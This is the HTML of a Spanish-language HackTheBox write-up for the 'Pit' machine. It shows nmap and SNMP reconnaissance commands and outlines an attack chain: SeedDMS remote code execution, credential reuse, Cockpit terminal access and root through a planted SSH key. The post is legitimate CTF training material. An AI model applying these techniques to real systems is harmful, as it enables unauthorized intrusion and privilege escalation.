@@ -1,0 +1,1972 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Pit</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Pit | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Pit" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux (CentOS 8) nivel medio. Caminaremos con el servicio SNMP, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos SeedDMS con un exploit que no debería servir contra esa versión (:( encontraremos credenciales en archivos yyyyy volveremos a caminar para ejecutar un script que ejecuta scripts 😛" />
+<meta property="og:description" content="Máquina Linux (CentOS 8) nivel medio. Caminaremos con el servicio SNMP, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos SeedDMS con un exploit que no debería servir contra esa versión (:( encontraremos credenciales en archivos yyyyy volveremos a caminar para ejecutar un script que ejecuta scripts 😛" />
+<link rel="canonical" href="http://localhost:4000/htb/pit" />
+<meta property="og:url" content="http://localhost:4000/htb/pit" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-09-25T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346banner.png" />
+<meta property="twitter:title" content="HackTheBox - Pit" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-09-25T00:00:00-07:00","datePublished":"2021-09-25T00:00:00-07:00","description":"Máquina Linux (CentOS 8) nivel medio. Caminaremos con el servicio SNMP, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos SeedDMS con un exploit que no debería servir contra esa versión (:( encontraremos credenciales en archivos yyyyy volveremos a caminar para ejecutar un script que ejecuta scripts 😛","headline":"HackTheBox - Pit","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/pit"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/pit"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Pit</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-09-25">25 Sep 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346banner.png" alt="HackTheBox - Pit">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux (<strong>CentOS 8</strong>) nivel medio. <u>Caminaremos</u> con el servicio <strong>SNMP</strong>, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos <strong>SeedDMS</strong> con un exploit que no debería servir contra esa versión (:( encontraremos credenciales en archivos yyyyy volveremos a caminar para ejecutar un script que ejecuta scripts 😛</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346pitHTB.png" alt="346pitHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/159204">polarbearer</a> &amp; <a href="https://www.hackthebox.eu/profile/125033">GibParadox</a>.</p>
+
+<p>Jmmm, un completo descontrol esto e.e</p>
+
+<p>Empezaremos jugando con un puerto <code>UDP</code> que tiene activo un servicio <code>SNMP</code> para monitorear tareas del sistema. Moviéndonos mucho con herramientas como <code>snmpwalk</code>, <code>snmp-check</code> y <code>snmpbulkwalk</code> lograremos encontrar una ruta de un servicio web, un usuario llamado <code>michelle</code> y el llamado a un binario: <code>/usr/bin/monitor</code>.</p>
+
+<p>Toqueteando la ruta web tendremos un <strong>software de gestión documental</strong> (<strong>DMS</strong>) llamado <code>SeedDMS</code>, lograremos pasar el <strong>login</strong> usando como contraseña y usuario: <strong>michelle</strong>.</p>
+
+<p>Estando dentro <u>se nos indica</u> que el servicio ha sido actualizado a la versión <code>5.1.15</code> debido a los problemas de seguridad encontrados en la versión <code>5.1.10</code>. Esto nos hace perder mucho tiempo, ya que finalmente logramos comprometer el <strong>DMS</strong> con un exploit de la versión <code>5.1.10</code>… 😑</p>
+
+<p>El exploit nos permite subir un archivo <code>.php</code> para ejecutar comandos en el sistema, lo ejecutaremos como el usuario <strong>nginx</strong>. No podremos obtener una <strong>Reverse Shell</strong>, pero podremos simular una <strong>Shell</strong> (léase bien el <u>simular</u>), esto con un script que creamos:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/pit/fakeSheedDMS.py">fakeSheedDMS.py</a></p>
+</blockquote>
+
+<p>Enumerando el sistema encontramos unas credenciales en un archivo llamado <code>settings.xml</code>, esas credenciales corresponden a un usuario de la base de datos.</p>
+
+<p>Haciendo reutilización de contraseñas y apoyados en nuestra enumeración web, lograremos autenticarnos como <strong>michelle</strong> (con la contraseña encontrada en <code>settings.xml</code>) contra otro login, esta vez de un servidor <strong>CentOS 8</strong> alojado en la web.</p>
+
+<p>Jugando con él veremos que existe un apartado llamado <strong>Terminal</strong> y si, en él podremos ejecutar comandos como <strong>michelle</strong> en el sistema.</p>
+
+<p>Finalmente con ayuda de lo que encontramos con <code>snmp...</code> recordaremos el binario <code>/usr/bin/monitor</code>, lo inspeccionaremos y veremos que lo único que hace es ejecutar los archivos que sus nombres empiecen con <strong>check</strong> y terminen en <strong>sh</strong> (básicamente un script de bash, ejemplo: <code>checkealorey.sh</code>) <strong><u>alojados en la ruta</u> <code>/usr/local/monitoring</code></strong>.</p>
+
+<p>Pero para que sea ejecutado debemos volver a validar nuestros procesos, o sea, ejecutar <code>snmpwalk</code> o <code>snmpbulkwalk</code> y que él sea el encargado de lanzar <code>/usr/bin/monitor</code>.</p>
+
+<p>En el script le indicaremos que guarde nuestra llave <strong>SSH</strong> publica en <code>/root/.ssh/authorized_keys</code>, así jugando con nuestra llave privada lograremos tener acceso a la máquina como el usuario <code>root</code>.</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 20%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Muuuuy juguetona (poco real), pero vamos a tener que mover muchas cosas y enumerar como dioses.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Bueno, se vienen cositas…</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Encontrando puertos abiertos de la máquina con ayuda de <strong>nmap</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Enumerando servidor web (puerto 80)</a>.</li>
+      <li><a href="#puerto-9090">Recorremos servicio sobre el puerto 9090</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#movimiento-lateral-dms">Movimiento lateral - Encontramos ruta web al DMS (SeedDMS)</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#expl_seeddms">Ejecución remota de comandos en <strong>SeedDMS</strong> (<strong>CVE-2019-12744</strong>)</a>.</li>
+      <li><a href="#expl_settingsXML">Encontramos credenciales de la base de datos en el archivo <strong>settings.xml</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#expl_centos_login_done">Movimiento lateral - Ejecución de comandos servidor <strong>CentOS</strong> con interfaz web</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.
+    <ul>
+      <li><a href="#privesc_scriptcheck">Generamos script que será ejecutado por <strong>/usr/bin/monitor</strong></a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Encontrando puertos abiertos de la máquina con ayuda de <strong>nmap</strong> <a href="#enum-nmap">📌</a></h2>
+
+<p>Empezaremos enumerando los puertos (servicios) abiertos de la máquina, lo haremos usando <strong>nmap</strong>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.241 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar la <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> creada por <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pero este escaneo va demasiado lento, entonces aprovechemos el uso de <code>--min-rate</code> para indicarle que no envíe menos de X paquetes en cada petición, en nuestro caso <strong>1000</strong> paquetes por petición:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open --min-rate=1000 -v 10.10.10.241 -oG initScan
+</code></pre>
+<p>Este va muy bien y finalmente nos devuelve:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -p- --open --min-rate=1000 -v -oG initScan 10.10.10.241
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.241 ()	Status: Up
+Host: 10.10.10.241 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9090/open/tcp//zeus-admin///	Ignored State: filtered (65532)
+# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 350.43 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong>: Nos permite entre varias cosas conseguir una Shell de manera segura.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Nos provee de un servidor web.</td>
+    </tr>
+    <tr>
+      <td>9090</td>
+      <td style="text-align: left"><strong><a href="https://en.wikipedia.org/wiki/Zeus_Web_Server">zeus-admin</a></strong>: Al parecer es una web para el control de ordenadores remotamente. Medio raro…</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Teniendo los puertos que están abiertos, haremos un escaneo de versiones y scripts relacionados con cada servicio, así tendremos info un poco más detallada:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno (en este caso daría igual, ya que son poquitos, pero bueno, si fueran varios puertos es muy funcional)</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.241
+    [*] Open ports: 22,80,9090
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 22,80,9090 -sC -sV 10.10.10.241 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -p 22,80,9090 -sC -sV -oN portScan 10.10.10.241
+Nmap scan report for 10.10.10.241
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
+|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
+|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
+80/tcp   open  http            nginx 1.14.1
+|_http-server-header: nginx/1.14.1
+|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
+9090/tcp open  ssl/zeus-admin?
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 400 Bad request
+|     Content-Type: text/html; charset=utf8
+|     Transfer-Encoding: chunked
+|     X-DNS-Prefetch-Control: off
+|     Referrer-Policy: no-referrer
+|     X-Content-Type-Options: nosniff
+|     Cross-Origin-Resource-Policy: same-origin
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;
+|     request
+|     &lt;/title&gt;
+|     &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+|     &lt;style&gt;
+|     body {
+|     margin: 0;
+|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
+|     font-size: 12px;
+|     line-height: 1.66666667;
+|     color: #333333;
+|     background-color: #f5f5f5;
+|     border: 0;
+|     vertical-align: middle;
+|     font-weight: 300;
+|_    margin: 0 0 10p
+| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
+| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
+| Not valid before: 2020-04-16T23:29:12
+|_Not valid after:  2030-06-04T16:09:12
+|_ssl-date: TLS randomness does not represent time
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9090-TCP:V=7.80%T=SSL%I=7%D=6/25%Time=60D65434%P=x86_64-pc-linux-gn
+SF:u%r(GetRequest,E70,"HTTP/1...Content-Type:
+...
+x2010p");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 202.07 seconds
+</code></pre>
+
+<p>Podemos destacar cositas:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.0 (protocol 2.0)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">nginx 1.14.1</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">9090</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left"><strong>nmap</strong> no sabe si realmente es <strong>zeus-admin</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Vemos un dominio en el certificado:</p>
+
+<ul>
+  <li><code>dms-pit.htb</code>.</li>
+</ul>
+
+<p>Lo podemos tener en cuenta por si algo.</p>
+
+<p>Por ahora nada más :) Pues juguemos y encontremos la forma de explotar esta máquina.</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80.png" alt="346page80" /></p>
+
+<p>La página por default de <a href="https://kinsta.com/es/base-de-conocimiento/que-es-nginx/">nginx</a> en <a href="https://www.redhat.com/es/technologies/linux-platforms/enterprise-linux">Red Hat</a>…</p>
+
+<p>Fuzzeando archivos o subdominios no encontramos nada interesante en ella y la versión de <strong>nginx</strong> (<code>1.14.1</code>) no nos proporciona tampoco nada relevante.</p>
+
+<p>…</p>
+
+<h2 id="puerto-9090">Puerto 9090 <a href="#puerto-9090">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090.png" alt="346page9090" /></p>
+
+<p>Un login de <strong>CentOS</strong>… En la parte de abajo vemos que hace referencia al dominio <code>pit.htb</code>, así que agreguemos este y el que encontramos con <strong>nmap</strong> al archivo <a href="https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html">/etc/hosts</a>, pueda que consigamos que la máquina responda diferente ante los dominios:</p>
+
+<pre><code class="language-bash">❱ cat /etc/hosts
+...
+10.10.10.241  pit.htb dms-pit.htb
+...
+</code></pre>
+
+<p>Pero obtenemos las mismas respuestas (:</p>
+
+<p>Interceptando una petición con <a href="https://openwebinars.net/blog/hacer-testeo-con-burp-suite/">BurpSuite</a> al intentarnos logear vemos algo llamativo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346burp_login9090.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Algo llamado <strong>cockpit</strong> que curiosamente tiene una parte del nombre de la máquina, así que de una me llamo la atención…</p>
+
+<p>Buscando en internet encontramos:</p>
+
+<p>🌐 <strong><em><u>Cockpit</u> is a web-based graphical interface for servers.</em></strong> <a href="https://cockpit-project.org/">cockpit-project.org</a></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_cockpitProject.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perfecto e interesante, ya que tenemos un login al parecer de un <strong><u>server</u> CentOS</strong> (toma sentido).</p>
+
+<p>Y confirmamos que estamos relacionados con <strong>cockpit</strong> gracias a una de sus imágenes de ejemplo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_cockpitLogin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones, pues veamos como entrarle e.e</p>
+
+<p>…</p>
+
+<p>Después de algunas horitas de enumerar y enumerar y dejar de enumerar pensando por donde ir y volver a enumerar y volver a perderme llegue a la conclusión que no sabía hacia donde tirar 😄</p>
+
+<p>Intente de todo con el CVE <a href="https://security.archlinux.org/CVE-2020-35850"><strong>CVE-2020-35850</strong></a>, veía cositas pero nanai… Estaba muy perdido, así que decidí buscar ayuda y fue bastante clara (a veces nos centramos tanto en algo que olvidamos cositas muuuy sencillas):</p>
+
+<blockquote>
+  <p>UDP.</p>
+</blockquote>
+
+<p>Y sí, podemos probar a hacer un escaneo de puertos <a href="https://es.wikipedia.org/wiki/Protocolo_de_datagramas_de_usuario"><strong>UDP</strong></a> con <strong>nmap</strong>, esto se lo indicamos con el parámetro <code>-sU</code>:</p>
+
+<pre><code class="language-bash">❱ nmap -sU -p- --open --min-rate=2000 -v 10.10.10.241 -oG initScanUDP
+</code></pre>
+
+<p>Despues de un rato obtenemos un nuevo puerto:</p>
+
+<pre><code class="language-bash">❱ cat initScanUDP 
+# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -sU -p- --open --min-rate=2000 -v -oG initScanUDP 10.10.10.241
+# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.241 (pit.htb)    Status: Up
+Host: 10.10.10.241 (pit.htb)    Ports: 161/open/udp//snmp///
+# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 370.61 seconds
+</code></pre>
+
+<p>Perfecto, encontramos un puerto que esta corriendo el servicio <a href="https://www.manageengine.com/es/network-monitoring/what-is-snmp.html">SNMP (Protocolo simple de administración de red)</a>:</p>
+
+<p>🟥 <strong><em>Facilita la administración de dispositivos de una red</em></strong>. <a href="https://es.wikipedia.org/wiki/Protocolo_simple_de_administraci%C3%B3n_de_red">Wikipedia</a></p>
+
+<p>Listones, ahora tomemos ese puerto y veamos que versión esta ejecutando y si tiene scripts relacionados:</p>
+
+<pre><code class="language-bash">❱ nmap -sU -p 161 -sC -sV 10.10.10.241 -oN portScanUPD
+</code></pre>
+
+<p>Nos devuelve:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Fri Jun 25 21:38:44 2021 as: nmap -sU -p 161 -sC -sV -oN portScanUDP 10.10.10.241
+Nmap scan report for pit.htb (10.10.10.241)
+Host is up (0.11s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: 4ca7e41263c5985e00000000
+|   snmpEngineBoots: 71
+|_  snmpEngineTime: 5h48m16s
+| snmp-processes: 
+|   1: 
+|     Name: systemd
+|     Path: /usr/lib/systemd/systemd
+|     Params: --switched-root --system --deserialize 18
+...
+...
+# Es gigante el output.
+# Es gigante el output.
+# Es gigante el output.
+...
+...
+|   27151: 
+|_    Name: kworker/1:4-cgroup_destroy
+| snmp-sysdescr: Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64
+|_  System uptime: 5h48m15.86s (2089586 timeticks)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 170.14 seconds
+</code></pre>
+
+<p>Destacamos que es un servidor <strong>SNMP</strong> de versión <strong>1</strong>. Y apoyándonos de <a href="https://hacking-etico.com/2014/03/27/leyendo-informacion-snmp-con-snmpwalk/">este recurso</a> entendemos que significa el <strong><em>public</em></strong> que vemos en el escaneo:</p>
+
+<p>Para poder enumerar o leer información de un servicio <strong>SNMP</strong> es necesario conocer algo llamado “comunidad”, que es simplemente el medio por el que el servicio esta publicando la información yyyyyyy por defecto viene con la comunidad <strong>public</strong>, que esa es la que tenemos activa y al parecer en funcionamiento con la máquina (:</p>
+
+<p>Así que teniendo la comunidad nos queda muy fácil empezar a enumerar… Existen varias herramientas, usaremos <a href="http://www.reydes.com/d/?q=Utilizar_SNMP_para_Obtener_mas_Informacion_con_Snmp_check_y_Onesixtyone">snmp-check</a>, <a href="https://hacking-etico.com/2014/03/27/leyendo-informacion-snmp-con-snmpwalk/">snmpwalk</a> y <a href="https://docs.oracle.com/cd/E19121-01/sf.x4140/820-6413-13/SNMP_commands_reference_appendix.html">snmpbulkwalk</a>…</p>
+
+<p>Siguiendo <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#enumerating-snmp">“lo que podemos hacer en cuanto a pentesting contra <strong>SNMP</strong>”</a> (y con ayuda de las herramientas anteriores) logramos encontrar varias cosas.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_hacktricks_enumSNMP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<blockquote>
+  <p>TODO se va a tratar de estos comandos y esta guia, solo que profundizaremos un poco en cada uno.</p>
+</blockquote>
+
+<h3 id="-snmp-check">📼 <u>snmp-check</u></h3>
+
+<p><strong>snmp-check</strong> nos muestra de una manera linda la interacción entre dispositivos (además vemos cositas de la máquina), le podemos indicar, la versión <code>-v</code>, la comunidad <code>-c</code> y claramente el servidor <strong>SNMP</strong>:</p>
+
+<pre><code class="language-bash">❱ snmp-check -v1 -c public 10.10.10.241
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpCheck1.png" alt="346bash_snmpCheck1" /></p>
+
+<p>…mucha info más…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpCheck2.png" alt="346bash_snmpCheck2" /></p>
+
+<p>Pues podemos destacar únicamente la versión del sistema, lo demás son procesos en ejecución, pero no vemos ninguno relevante o que nos dé algo más de información, así que sigamos jugando.</p>
+
+<h3 id="-snmpwalk">📼 <u>snmpwalk</u></h3>
+
+<p><strong>snmpwalk</strong> nos ayuda a ver los mismos procesos enumerados con <strong><em>snmp-check</em></strong>, pero ya entran en juego los <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids"><strong>OIDs</strong></a>, que serían los <em>identificadores de cada objeto</em>.</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids">Pentesting SNMP - OIDs</a>.</li>
+</ul>
+
+<p>Podemos hacer varias maromas con él, lo único que cambia (si queremos) es que debemos tomar la versión <code>2</code>, lo demás es igual:</p>
+
+<pre><code class="language-bash">❱ snmpwalk -v2c -c public 10.10.10.241
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>… más cositas…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
